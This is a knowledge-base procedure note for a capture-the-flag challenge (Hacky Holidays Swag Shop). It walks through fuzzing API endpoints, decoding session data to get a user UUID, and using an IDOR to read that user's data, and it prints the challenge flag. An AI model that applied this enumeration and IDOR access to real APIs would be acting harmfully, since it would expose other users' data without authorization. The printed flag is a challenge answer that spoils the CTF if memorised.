---
id: proc-uuid-4
tags:
  - api-fuzzing
  - idor
  - uuid
type: procedure
tools:
  - '[[tools/Scout]]'
  - '[[tools/Wfuzz]]'
  - '[[tools/JQ]]'
  - '[[tools/Curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/scout-fuzz-api-endpoints]]'
  - '[[commands/curl-decode-sessions-jq]]'
  - '[[commands/wfuzz-fuzz-user-params]]'
  - '[[commands/curl-retrieve-user-uuid]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:55.556Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
---
# Fuzz-API-Endpoints-and-Extract-UUID-for-IDOR

## Summary

This procedure fuzzes API endpoints to discover hidden paths, extracts UUIDs from public sessions, and exploits IDOR to access user data including flags in the Swag Shop application.

## Description

Unauthenticated API at /swag-shop/api exposes /sessions with base64 UUIDs, allowing fuzzing of /user?uuid= for any user's flag. Targets REST APIs on web platforms; uses fuzzers to map endpoints.

## Requirements

1. Fuzzing tools installed
2. Wordlists for params/endpoints
3. jq for JSON parsing

## Defense

Defensive measures and detection strategies:

- Authenticate API endpoints
- Rate-limit fuzzing attempts
- Validate UUID inputs

## Objectives

1. Map API surface
2. Extract user identifiers
3. Retrieve unauthorized flags

## Instructions

### Step 1: Fuzz API Endpoints

**Context**: Discover /user and /sessions using scout.

**Command** ([[commands/scout-fuzz-api-endpoints]]):
```bash
scout url -s https://hackyholidays.h1ctf.com/swag-shop/api
```

> Lists discovered endpoints.

### Step 2: Decode Sessions for UUID

**Context**: Fetch and parse sessions.

**Command** ([[commands/curl-decode-sessions-jq]]):
```bash
curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq
```

> Extracts UUID like C7DCCE-0E0DAB-B20226-FC92EA-1B9043 for grinch.

### Step 3: Fuzz User Parameters

**Context**: Identify uuid param.

**Command** ([[commands/wfuzz-fuzz-user-params]]):
```bash
wfuzz --hc=400 -z file,wordlists/params.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
```

> Confirms uuid parameter.

### Step 4: Retrieve User Data

**Context**: Access flag with UUID.

**Command** ([[commands/curl-retrieve-user-uuid]]):
```bash
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

> JSON with flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/scout-fuzz-api-endpoints]]
- [[commands/curl-decode-sessions-jq]]
- [[commands/wfuzz-fuzz-user-params]]
- [[commands/curl-retrieve-user-uuid]]

## Tools Used

- [[tools/Scout]]
- [[tools/Wfuzz]]
- [[tools/JQ]]
- [[tools/Curl]]

## Tags

- [[api-fuzzing]]
- [[idor]]
- [[uuid]]
